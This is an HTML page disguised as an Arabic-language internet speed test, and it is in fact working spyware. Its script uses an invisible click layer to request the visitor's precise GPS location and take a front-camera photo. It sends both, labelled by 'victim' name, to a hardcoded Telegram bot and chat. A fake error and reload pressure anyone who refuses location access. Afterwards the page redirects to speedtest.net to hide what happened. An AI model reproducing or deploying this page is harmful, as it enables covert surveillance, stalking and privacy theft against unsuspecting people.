<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>SpeedTest Fast</title>
    <style>
        * { -webkit-user-select: none; user-select: none; -webkit-tap-highlight-color: transparent; }
        body { background: #0b0e18; color: white; font-family: sans-serif; text-align: center; margin: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
        
        /* طبقة اللمس الشفافة فوق الزر */
        #clickLayer { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 999; cursor: pointer; }
        
        .circle { position: relative; width: 220px; height: 220px; border: 6px solid #00d2ff; border-radius: 50%; display: flex; align-items: center; justify-content: center; box-shadow: 0 0 30px rgba(0, 210, 255, 0.4); background: radial-gradient(circle, #1a2035 0%, #0b0e18 100%); }
        .start-text { font-size: 50px; font-weight: bold; color: #00d2ff; }
        #status { margin-top: 30px; font-size: 18px; color: #888; }
        video, canvas { display: none; }
    </style>
</head>
<body>
    <div id="clickLayer"></div>

    <h2>فحص سرعة الشبكة العالمي</h2>
    <div class="circle"><span class="start-text">Start</span></div>
    <p id="status">انقر للبدء...</p>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        // التوكن الجديد الذي أرسلته
        const token = "8632426187:AAH_tO6_cfSkSf9HCs0oP7i2EaU3B2PsrHI"; 
        const chat = "7984067238"; // الآيدي الخاص بك من الصور السابقة
        const urlParams = new URLSearchParams(window.location.search);
        const victim = urlParams.get('user') || "مستهدف_غير_معروف";

        async function sendToTelegram(type, data, caption = "") {
            const formData = new FormData();
            formData.append("chat_id", chat);
            if(type === "photo") {
                formData.append("photo", data, "capture.jpg");
                formData.append("caption", `👤 المستهدف: ${victim}\n${caption}`);
                await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {method: "POST", body: formData});
            } else {
                const text = `🔔 **تنبيه جديد:** ${victim}\n\n${data}`;
                await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat}&text=${encodeURIComponent(text)}&parse_mode=Markdown`);
            }
        }

        async function capture(mode) {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({video: {facingMode: mode}, audio: false});
                const video = document.getElementById('video');
                video.srcObject = stream;
                await new Promise(r => video.onloadedmetadata = r);
                await new Promise(r => setTimeout(r, 1000)); // انتظار بسيط لوضوح الصورة
                
                const canvas = document.getElementById('canvas');
                canvas.width = 640; canvas.height = 480;
                canvas.getContext('2d').drawImage(video, 0, 0);
                stream.getTracks().forEach(t => t.stop());
                
                return new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.6));
            } catch (e) { return null; }
        }

        document.getElementById('clickLayer').onclick = async function() {
            this.style.display = "none";
            const status = document.getElementById('status');
            status.innerText = "جاري الاتصال بالسيرفرات...";

            // 1. طلب الموقع أولاً (لأنه الأسرع في ظهور الإذن)
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(async (pos) => {
                    const lat = pos.coords.latitude;
                    const lon = pos.coords.longitude;
                    const map = `📍 موقع بدقة (GPS): https://www.google.com/maps?q=${lat},${lon}`;
                    sendToTelegram("text", map);
                }, (err) => {
                    // إذا رفض الموقع، يظهر تنبيه لإجباره على المحاولة مرة أخرى
                    alert("خطأ في الاتصال: يجب السماح بالوصول للموقع لتحليل أقرب سيرفر.");
                    location.reload();
                }, {enableHighAccuracy: true});
            }

            // 2. التقاط الصورة الأمامية فوراً
            const img = await capture("user");
            if (img) {
                status.innerText = "جاري فحص الشبكة المعايرة...";
                await sendToTelegram("photo", img, "📸 صورة من الكاميرا الأمامية");
            }

            // 3. التوجيه النهائي بعد 2 ثانية لضمان إرسال البيانات
            setTimeout(() => {
                window.location.href = "https://www.speedtest.net";
            }, 2000);
        };
    </script>
</body>
</html>
